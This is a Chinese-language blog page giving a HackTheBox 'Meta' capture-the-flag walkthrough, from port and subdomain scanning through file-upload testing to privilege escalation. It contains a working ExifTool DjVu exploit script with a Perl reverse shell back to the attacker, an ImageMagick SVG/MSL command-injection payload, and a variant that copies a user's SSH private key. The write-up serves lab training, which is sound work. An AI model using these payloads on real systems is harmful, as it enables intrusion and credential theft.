@@ -1,0 +1,876 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Dar3n1y">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Machines（Meta） 信息搜集使用masscan扫描全端口 1sudo masscan -p1-65535 10.10.11.140 --rate&#x3D;1000   使用nmap扫描常用端口 1nmap -A -sV 10.10.11.140    从扫描结果看出开放了22和80端口  访问80端口，发现重定向一个网址名为artcorp.htb的网址，修改hosts文件绑定域名，可见是一个简单">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox-Meta">
+<meta property="og:url" content="http://example.com/2022/03/05/HackTheBox-Meta/index.html">
+<meta property="og:site_name" content="Dar3n1y&#39;s Blog">
+<meta property="og:description" content="Machines（Meta） 信息搜集使用masscan扫描全端口 1sudo masscan -p1-65535 10.10.11.140 --rate&#x3D;1000   使用nmap扫描常用端口 1nmap -A -sV 10.10.11.140    从扫描结果看出开放了22和80端口  访问80端口，发现重定向一个网址名为artcorp.htb的网址，修改hosts文件绑定域名，可见是一个简单">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-1.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-2.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-3.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-4.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-5.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-6.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-7.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-8.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-9.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-10.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-11.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-12.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-13.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-14.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-15.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-16.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-17.png">
+<meta property="article:published_time" content="2022-03-05T14:12:51.174Z">
+<meta property="article:modified_time" content="2022-04-17T10:52:31.349Z">
+<meta property="article:author" content="Dar3n1y">
+<meta property="article:tag" content="HackTheBox">
+<meta property="article:tag" content="靶机">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131.png">
+  
+  
+  <title>HackTheBox-Meta - Dar3n1y&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true,"scope":["home"]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Dar3n1y</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle">HackTheBox-Meta</span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-03-05 22:12" pubdate>
+          March 5, 2022 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          11k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          90 mins
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> views
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">HackTheBox-Meta</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    Last updated on April 17, 2022 pm
+                  
+                
+              </p>
+            
+            <div class="markdown-body">
+              
+              <h3 id="Machines（Meta）"><a href="#Machines（Meta）" class="headerlink" title="Machines（Meta）"></a>Machines（Meta）</h3><p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131.png" srcset="/img/loading.gif" lazyload alt="image-20220305133205477"></p>
+<h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>使用masscan扫描全端口</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> masscan -p1-<span class="hljs-number">65535</span> <span class="hljs-number">10.10.11.140</span> --rate=<span class="hljs-number">1000</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-1.png" srcset="/img/loading.gif" lazyload alt="image-20220305154950771"></p>
+<p>使用nmap扫描常用端口</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">nmap -<span class="hljs-keyword">A</span> -sV <span class="hljs-number">10.10.11.140</span>  <br></code></pre></td></tr></table></figure>
+
+<p>从扫描结果看出开放了22和80端口</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-2.png" srcset="/img/loading.gif" lazyload alt="image-20220305154437331"></p>
+<p>访问80端口，发现重定向一个网址名为artcorp.htb的网址，修改hosts文件绑定域名，可见是一个简单的门户网站</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-3.png" srcset="/img/loading.gif" lazyload alt="image-20220305152919577"></p>
+<p>发现该网站没有其他功能入口，w-w 顺手拿起大佬的脚本跑一边站点目录，看有没有好东西</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-4.png" srcset="/img/loading.gif" lazyload alt="image-20220305153310734"></p>
+<p>嗯。。。无，再跑下子域名</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ffuf -c -w <span class="hljs-string">&#x27;/media/psf/Home/Data/Dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt&#x27;</span> -u http:<span class="hljs-regexp">//</span>artcorp.htb/ -H <span class="hljs-string">&quot;Host: FUZZ.artcorp.htb&quot;</span> -mc <span class="hljs-number">200</span> <br></code></pre></td></tr></table></figure>
+
+<p>发现存在dev01.artcorp.htb子域名</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-5.png" srcset="/img/loading.gif" lazyload alt="image-20220305162607984"></p>
+<p>在hosts中绑定子域名，访问域名有东西，是一个开发测试的环境</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-6.png" srcset="/img/loading.gif" lazyload alt="image-20220305170234261"></p>
+<p>点击MetaView，发现一个文件上传的功能点Upload</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-7.png" srcset="/img/loading.gif" lazyload alt="image-20220305170542626"></p>
+<p>我们可以知道这是一个php的站点，先直接上传一个后缀为php的木马，提示不被允许</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-8.png" srcset="/img/loading.gif" lazyload alt="image-20220305172737257"></p>
+<p>通过简单测试发现系统应该是校验了上传文件的头字节来判断是否是允许的图片格式</p>
+<p>直接制作图片马</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">cat <span class="hljs-number">123</span><span class="hljs-selector-class">.jpeg</span> eval<span class="hljs-selector-class">.php</span> &gt; eval123.php<br></code></pre></td></tr></table></figure>
+
+<p>再次上传成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-9.png" srcset="/img/loading.gif" lazyload alt="image-20220305173235653"></p>
+<p>这里找了没有上传文件保存路径，随便测了几个常规文件保存路径，无果放弃！（应该在早点注意这个条件的，扎心了…）</p>
+<p>回到上传成功的页面，查看图片列出的属性信息格式，搜索发现这是一个exiftool的cve漏洞</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-10.png" srcset="/img/loading.gif" lazyload alt="image-20220315233405370"></p>
+<p>上传图片返回的图片属性</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-11.png" srcset="/img/loading.gif" lazyload alt="image-20220305191009798"></p>
+<p>（做到这里突然Kali直接无界面了，怎么重启都一样，卡了很久，还有网上搜索姿势要对，废了好长时间才找到了大佬的解决办法！！！）</p>
+<p>继续……</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>​	<strong>ExifTool 7.44至12.23在DjVu模块中存在一个错误，该错误允许在解析恶意图像时执行任意代码</strong></p>
+<blockquote>
+<p>Exp</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/OneSecCyber/JPEG_RCE">https://github.com/OneSecCyber/JPEG_RCE</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/convisolabs/CVE-2021-22204-exiftool">https://github.com/convisolabs/CVE-2021-22204-exiftool</a></p>
+</blockquote>
+<p>把第二个链接下载下来,更改exploit.py中的地址和端口</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/bin/env python3</span><br><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> subprocess<br><br>ip = <span class="hljs-string">&#x27;10.10.11.17&#x27;</span> //修改成自己的地址<br>port = <span class="hljs-string">&#x27;9090&#x27;</span>	//准备监听的端口<br><br>payload = <span class="hljs-string">b&quot;(metadata \&quot;\c$&#123;use MIME::Base64;eval(decode_base64(&#x27;&quot;</span><br><br><br>payload = payload + base64.b64encode( <span class="hljs-string">f&quot;use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#x27;tcp&#x27;));if(connect(S,sockaddr_in(<span class="hljs-subst">&#123;port&#125;</span>,inet_aton(&#x27;<span class="hljs-subst">&#123;ip&#125;</span>&#x27;))))&#123;&#123;open(STDIN,&#x27;&gt;&amp;S&#x27;);open(STDOUT,&#x27;&gt;&amp;S&#x27;);open(STDERR,&#x27;&gt;&amp;S&#x27;);exec(&#x27;/bin/sh -i&#x27;);&#125;&#125;;&quot;</span>.encode() )<br><br>payload = payload + <span class="hljs-string">b&quot;&#x27;))&#125;;\&quot;)&quot;</span><br><br><br>payload_file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;payload&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br>payload_file.write(payload.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>payload_file.close()<br><br><br>subprocess.run([<span class="hljs-string">&#x27;bzz&#x27;</span>, <span class="hljs-string">&#x27;payload&#x27;</span>, <span class="hljs-string">&#x27;payload.bzz&#x27;</span>])<br>subprocess.run([<span class="hljs-string">&#x27;djvumake&#x27;</span>, <span class="hljs-string">&#x27;exploit.djvu&#x27;</span>, <span class="hljs-string">&quot;INFO=1,1&quot;</span>, <span class="hljs-string">&#x27;BGjp=/dev/null&#x27;</span>, <span class="hljs-string">&#x27;ANTz=payload.bzz&#x27;</span>])<br>subprocess.run([<span class="hljs-string">&#x27;exiftool&#x27;</span>, <span class="hljs-string">&#x27;-config&#x27;</span>, <span class="hljs-string">&#x27;configfile&#x27;</span>, <span class="hljs-string">&#x27;-HasselbladExif&lt;=exploit.djvu&#x27;</span>, <span class="hljs-string">&#x27;image.jpg&#x27;</span>]) <br></code></pre></td></tr></table></figure>
+
+
+
+<p>执行exploit.py脚本生成 payload图片</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 exploit.py<br></code></pre></td></tr></table></figure>
+
+<p>(这里需要提前 <strong>sudo apt install djvulibre-bin exiftool</strong>)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-12.png" srcset="/img/loading.gif" lazyload alt="image-20220315190242037"></p>
+<p>然后再开一个终端 使用nc监听9090 </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -lvvp 9090<br></code></pre></td></tr></table></figure>
+
+<p>上传新生成的image.jpg </p>
+<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-13.png" srcset="/img/loading.gif" lazyload alt="image-20220315192328974"></p>
+<p>可以发现shell回连成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-14.png" srcset="/img/loading.gif" lazyload alt="image-20220315192525596"></p>
+<p>简单查看系统信息(是一个www-data用户)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-15.png" srcset="/img/loading.gif" lazyload alt="image-20220315193045328"></p>
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>查看&#x2F;etc&#x2F;passwd中可登录的用户</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /etc/passwd | grep /bin/bash</span><br>root:x:0:0:root:/root:/bin/bash<br>thomas:x:1000:1000:thomas,,,:/home/thomas:/bin/bash<br></code></pre></td></tr></table></figure>
+
+<h5 id="User-thomas"><a href="#User-thomas" class="headerlink" title="User (thomas)"></a>User (thomas)</h5><p>​		目的是为了拿到&#x2F;home&#x2F;thomas&#x2F;user.txt中的flag</p>
+<p>切换&#x2F;bin&#x2F;bash</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-16.png" srcset="/img/loading.gif" lazyload alt="image-20220315195923497"></p>
+<p>发现User用户下存在.ssh,但是无权限查看</p>
+<p>查看从时间2022-01-01以来创建的新文件,找到一个脚本文件(参考的大佬的思路,这个不好找啊,另外一种就是上传<a target="_blank" rel="noopener" href="https://github.com/DominicBreuker/pspy/releases/tag/v1.2.0">pspy小工具</a>)</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@meta:/home/thomas$ find /usr/ -type f -newermt &#x27;2022-01-01&#x27; -ls<br>find /usr/ -type f -newermt &#x27;2022-01-01&#x27; -ls<br>   152500      4 -rwxr-xr-x   1 root     root          126 Jan  3 10:13 /usr/local/bin/convert_images.sh<br></code></pre></td></tr></table></figure>
+
+<p>查看文件内容</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@meta:/usr/local/bin$ cat convert_images.sh<br>cat convert_images.sh<br><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br>cd /var/www/dev01.artcorp.htb/convert_images/ &amp;&amp; /usr/local/bin/mogrify -format png *.* 2&gt;/dev/null<br>pkill mogrify<br></code></pre></td></tr></table></figure>
+
+<p>里面的代码逻辑是 进入一个目录下,执行mogrify命令把该目录下发现的文件转换成png,最后杀死进程(<strong>imagemagick的mogrify用来批处理照片的脚本</strong>)</p>
+<p>查看该命令版本</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@meta:/usr/local/bin$ mogrify -version<br>mogrify -version<br>Version: ImageMagick 7.0.10-36 Q16 x86_64 2021-08-29 https://imagemagick.org<br>Copyright: © 1999-2020 ImageMagick Studio LLC<br>License: https://imagemagick.org/script/license.php<br>Features: Cipher DPC HDRI OpenMP(4.5) <br>Delegates (built-in): fontconfig freetype jng jpeg png x xml zlib<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html">https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html</a> (师傅推荐)</p>
+<p><a target="_blank" rel="noopener" href="https://imagetragick.com/">https://imagetragick.com/</a></p>
+</blockquote>
+<p>最好是通过上传一个poc.svg到&#x2F;etc&#x2F;shm下(这里我比较废,试了直接在shell里面vi写无法保存——shell太烂了,试了echo写无权限,试了scp连不上本机,最后通过wget下载的^_^早干嘛去了……)</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml">#poc.svg<br><span class="hljs-tag">&lt;<span class="hljs-name">image</span> <span class="hljs-attr">authenticate</span>=<span class="hljs-string">&#x27;ff&quot; `echo $(id)&gt; /dev/shm/0wned`;&quot;&#x27;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">read</span> <span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;pdf:/etc/passwd&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">get</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;base-width&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;base-height&quot;</span> /&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">resize</span> <span class="hljs-attr">geometry</span>=<span class="hljs-string">&quot;400x400&quot;</span> /&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">write</span> <span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;test.png&quot;</span> /&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;700&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;700&quot;</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="hljs-attr">xmlns:xlink</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/xlink&quot;</span>&gt;</span>       <br>  <span class="hljs-tag">&lt;<span class="hljs-name">image</span> <span class="hljs-attr">xlink:href</span>=<span class="hljs-string">&quot;msl:poc.svg&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;100&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;100&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">image</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>然后把poc.svg复制到&#x2F;var&#x2F;www&#x2F;dev01.artcorp.htb&#x2F;convert_images&#x2F;这个目录下,过些许时间就生成了</p>
+<p>&#x2F;dev&#x2F;shm&#x2F;0wned文件,尝试是否有权限查看文件(可以查看就是成功了)</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@meta:/var/www/dev01.artcorp.htb/convert_images$ ls -al /dev/shm<br>ls -al /dev/shm<br>total 8<br>drwxrwxrwt  2 root     root       80 Mar 15 13:44 .<br>drwxr-xr-x 16 root     root     3080 Mar 15 13:33 ..<br>-rw-r--r--  1 thomas   thomas     54 Mar 15 13:44 0wned<br>-rw-r--r--  1 www-data www-data  406 Mar 15 13:39 poc.svg<br>www-data@meta:/dev/shm$ cat 0wned<br>cat 0wned<br>uid=1000(thomas) gid=1000(thomas) groups=1000(thomas)<br></code></pre></td></tr></table></figure>
+
+<p>现在把payload换成读取ssh_key</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">&lt;image authenticate=&#x27;ff&quot; `echo $(cat ~/.ssh/id_rsa)&gt; /dev/shm/id_rsa`;&quot;&#x27;&gt;<br>  &lt;read filename=&quot;pdf:/etc/passwd&quot;/&gt;<br>  &lt;get width=&quot;base-width&quot; height=&quot;base-height&quot; /&gt;<br>  &lt;resize geometry=&quot;400x400&quot; /&gt;<br>  &lt;write filename=&quot;test.png&quot; /&gt;<br>  &lt;svg width=&quot;700&quot; height=&quot;700&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot;&gt;       <br>  &lt;image xlink:href=&quot;msl:poc.svg&quot; height=&quot;100&quot; width=&quot;100&quot;/&gt;<br>  &lt;/svg&gt;<br>&lt;/image&gt;<br></code></pre></td></tr></table></figure>
+
+<p>重复一遍操作,吐槽下文件生成的好慢啊!!!</p>
